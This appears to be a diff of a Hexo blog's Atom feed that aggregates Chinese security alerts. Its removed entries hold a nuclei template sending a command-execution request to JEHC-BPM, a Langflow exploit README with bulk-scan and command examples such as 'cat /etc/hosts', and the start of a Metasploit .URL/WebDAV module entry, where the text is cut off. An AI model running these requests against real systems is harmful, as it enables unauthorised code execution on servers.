@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-18T09:15:27.143Z</updated>
+  <updated>2025-06-18T09:51:25.725Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,168 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>网络安全信息与动态周报2025年第24期（6月9日-6月15日）</title>
+    <link href="http://example.com/2025/06/18/weixin_3846001241/"/>
+    <id>http://example.com/2025/06/18/weixin_3846001241/</id>
+    <published>2025-06-18T09:51:25.729Z</published>
+    <updated>2025-06-18T09:51:25.725Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/uvFbEW9S25ALX0tHb-SI-g">https://mp.weixin.qq.com/s/uvFbEW9S25ALX0tHb-SI-g</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/uvFbEW9S25ALX0tHb-SI-g&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【已复现】泛微E-cology9存在远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/18/weixin_2337216853/"/>
+    <id>http://example.com/2025/06/18/weixin_2337216853/</id>
+    <published>2025-06-18T09:51:24.382Z</published>
+    <updated>2025-06-18T09:51:24.377Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/i3aNLllLMP-KDIv1CoQaNg">https://mp.weixin.qq.com/s/i3aNLllLMP-KDIv1CoQaNg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/i3aNLllLMP-KDIv1CoQaNg&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>伊朗在日益升级的地区冲突中减缓互联网速度以防止网络攻击</title>
+    <link href="http://example.com/2025/06/18/weixin_1512984358/"/>
+    <id>http://example.com/2025/06/18/weixin_1512984358/</id>
+    <published>2025-06-18T09:45:09.582Z</published>
+    <updated>2025-06-18T09:45:09.580Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Tn3uxgVCfreai-xlsb6a5w">https://mp.weixin.qq.com/s/Tn3uxgVCfreai-xlsb6a5w</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Tn3uxgVCfreai-xlsb6a5w&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Chrome 漏洞让攻击者执行任意代码 - 立即更新！</title>
+    <link href="http://example.com/2025/06/18/weixin_2430850262/"/>
+    <id>http://example.com/2025/06/18/weixin_2430850262/</id>
+    <published>2025-06-18T09:45:08.066Z</published>
+    <updated>2025-06-18T09:45:08.064Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/zEOoVYy0D8Re7VtQh_FzFA">https://mp.weixin.qq.com/s/zEOoVYy0D8Re7VtQh_FzFA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/zEOoVYy0D8Re7VtQh_FzFA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【高危漏洞预警】Windows SMB 权限提升漏洞(CVE-2025-33073)</title>
+    <link href="http://example.com/2025/06/18/weixin_2906810034/"/>
+    <id>http://example.com/2025/06/18/weixin_2906810034/</id>
+    <published>2025-06-18T09:35:46.982Z</published>
+    <updated>2025-06-18T09:35:46.978Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/pWPTkT8K9ZuaI_-nYrm89A">https://mp.weixin.qq.com/s/pWPTkT8K9ZuaI_-nYrm89A</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/pWPTkT8K9ZuaI_-nYrm89A&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【高危漏洞预警】泛微E-cology9 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/18/weixin_2779470576/"/>
+    <id>http://example.com/2025/06/18/weixin_2779470576/</id>
+    <published>2025-06-18T09:35:45.426Z</published>
+    <updated>2025-06-18T09:35:45.426Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/fAQmV16XBQQPdwteeREOPQ">https://mp.weixin.qq.com/s/fAQmV16XBQQPdwteeREOPQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/fAQmV16XBQQPdwteeREOPQ&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</title>
@@ -388,166 +550,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【预警】Exchange服务器被破坏 Outlook 页面植入恶意代码</title>
-    <link href="http://example.com/2025/06/18/weixin_1117222119/"/>
-    <id>http://example.com/2025/06/18/weixin_1117222119/</id>
-    <published>2025-06-18T06:05:09.586Z</published>
-    <updated>2025-06-18T06:05:09.581Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/fSY4jdP8TWeEURFVF2nmMg">https://mp.weixin.qq.com/s/fSY4jdP8TWeEURFVF2nmMg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/fSY4jdP8TWeEURFVF2nmMg&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>JEHC-BPM 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/18/github_3469228673/"/>
-    <id>http://example.com/2025/06/18/github_3469228673/</id>
-    <published>2025-06-18T05:15:11.958Z</published>
-    <updated>2025-06-18T05:15:11.957Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> JEHC-BPM 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-45854</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> JEHC-BPM组件&#x2F;server&#x2F;executeExec中存在远程命令执行漏洞，攻击者可以执行任意代码。该漏洞由于executeExec端点中的授权检查不足，允许直接执行命令。</p><p><strong>产品名称：</strong> JEHC-BPM</p><p><strong>影响版本：</strong> &lt;&#x3D; v2.0.1</p><p><strong>搜索语法：</strong> body&#x3D;”JEHC”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/7e25dba24ba0c6acf05f82732d7500786c021680/http%2Fcves%2F2025%2FCVE-2025-45854.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/7e25dba24ba0c6acf05f82732d7500786c021680/http%2Fcves%2F2025%2FCVE-2025-45854.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">45854</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> JEHC-BPM <span class="hljs-operator">-</span> Remote Code Execute<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A Remote Command Execution vulnerability <span class="hljs-keyword">in</span> the component <span class="hljs-symbol">/server/executeExec</span> of JEHC-BPM <span class="hljs-operator">&lt;=</span> v2.<span class="hljs-number">0.1</span> allows attackers to execute arbitrary code. The vulnerability exists due to insufficient authorization checks <span class="hljs-keyword">in</span> the executeExec endpoint which allows direct command execution.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//gist.github.com/Cafe-Tea/bc14b38f4bfd951de2979a24c3358460</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-45854</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">10</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">45854</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">869</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">product:</span> JEHC-BPM<br>    <span class="hljs-params">fofa-query:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;JEHC&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,jehc-bpm,rce<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)  <br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;JEHC&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;XSHI&quot;</span><br>        <span class="hljs-params">case-insensitive:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/server/executeExec</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        &#123;<br>          <span class="hljs-string">&quot;actuator&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;clientIp&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;port&quot;</span>: <span class="hljs-number">8082</span>,<br>            <span class="hljs-string">&quot;applicationName&quot;</span>: <span class="hljs-string">&quot;testApp&quot;</span>,<br>            <span class="hljs-string">&quot;env&quot;</span>: <span class="hljs-string">&quot;prod&quot;</span>,<br>            <span class="hljs-string">&quot;uploadTime&quot;</span>: <span class="hljs-number">1704523200000</span>,<br>            <span class="hljs-string">&quot;hasPrefixApplicationName&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;clientHttpPrefix&quot;</span>: <span class="hljs-string">&quot;http&quot;</span><br>          &#125;,<br>          <span class="hljs-string">&quot;execParams&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;id&quot;</span><br>          &#125;<br>        &#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=[0-9]+.*gid=[0-9]+.*&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; JEHC-BPM 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Langflow 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/18/github_3448974018/"/>
-    <id>http://example.com/2025/06/18/github_3448974018/</id>
-    <published>2025-06-18T04:15:12.310Z</published>
-    <updated>2025-06-18T04:15:12.310Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Langflow 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-3248</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-3248是一个影响Langflow的漏洞，允许远程且未经认证的攻击者通过精心构造的HTTP请求在易受攻击的Langflow实例上执行任意代码。此漏洞利用Python编写，支持单URL或批量扫描，自动检测漏洞，并具备命令执行能力。</p><p><strong>产品厂商：</strong> Langflow</p><p><strong>产品名称：</strong> Langflow</p><p><strong>来源：</strong> <a href="https://github.com/imbas007/CVE-2025-3248">https://github.com/imbas007/CVE-2025-3248</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-3248.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Langflow-CVE-2025-3248-Exploit"><a href="#Langflow-CVE-2025-3248-Exploit" class="headerlink" title="Langflow CVE-2025-3248 Exploit"></a>Langflow CVE-2025-3248 Exploit</h2><p>A Python-based exploit for CVE-2025-3248, which allows remote and unauthenticated attackers to execute arbitrary code on vulnerable Langflow instances through crafted HTTP requests.</p><h3 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h3><ul><li>Single URL or bulk scanning from file</li><li>Automatic vulnerability detection</li><li>Command execution capability</li><li>Detailed output with timing information</li><li>Results saved to separate files for vulnerable and non-vulnerable targets</li><li>Benchmark statistics for scan performance</li></ul><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="Single-URL-Scan"><a href="#Single-URL-Scan" class="headerlink" title="Single URL Scan"></a>Single URL Scan</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cve-2025-3248.py http://target-url -c <span class="hljs-string">&quot;cat /etc/hosts&quot;</span><br></code></pre></td></tr></table></figure><h4 id="Bulk-Scan-from-File"><a href="#Bulk-Scan-from-File" class="headerlink" title="Bulk Scan from File"></a>Bulk Scan from File</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cve-2025-3248.py -f targets.txt<br></code></pre></td></tr></table></figure><h4 id="Custom-Command-Execution"><a href="#Custom-Command-Execution" class="headerlink" title="Custom Command Execution"></a>Custom Command Execution</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cve-2025-3248.py -f targets.txt -c <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Example-Output"><a href="#Example-Output" class="headerlink" title="Example Output"></a>Example Output</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[<span class="hljs-strong">*] Progress: 1/10 URLs checked</span><br><span class="hljs-strong">[*</span>] Checking https://example.com<br>[+] Vulnerable - Command Output:<br><span class="hljs-section">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="hljs-section">--------------------------------------------------</span><br><br>[<span class="hljs-strong">*] Scan Summary:</span><br><span class="hljs-strong">[+] Total URLs checked: 10</span><br><span class="hljs-strong">[+] Vulnerable URLs: 3</span><br><span class="hljs-strong">[+] Not Vulnerable URLs: 7</span><br><span class="hljs-strong">[*] Total scan time: 25.34s</span><br><span class="hljs-strong">[*</span>] Results saved to files with timestamp<br></code></pre></td></tr></table></figure><p>source: <a href="https://github.com/verylazytech">https://github.com/verylazytech</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Langflow 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</title>
-    <link href="http://example.com/2025/06/18/github_1971344654/"/>
-    <id>http://example.com/2025/06/18/github_1971344654/</id>
-    <published>2025-06-18T03:45:14.013Z</published>
-    <updated>2025-06-18T03:45:14.008Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-33053</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块通过生成恶意的.URL文件来利用CVE-2025-33053，该文件指向一个受信任的LOLBAS二进制文件，其参数设计用于触发意外行为。可选地，生成一个有效载荷并托管在指定的WebDAV目录上。当受害者打开快捷方式时，它将尝试访问WebDAV路径，可能导致通过受信任的二进制文件实现远程代码执行。</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/ec5ba0bd0db6cea65b851629980f6e39d859c776/modules%2Fexploits%2Fwindows%2Ffileformat%2Fcve_2025_33053.rb">https://github.com/rapid7/metasploit-framework/blob/ec5ba0bd0db6cea65b851629980f6e39d859c776/modules%2Fexploits%2Fwindows%2Ffileformat%2Fcve_2025_33053.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment"># frozen_string_literal: true</span><br><br><span class="hljs-comment"># Metasploit module to exploit 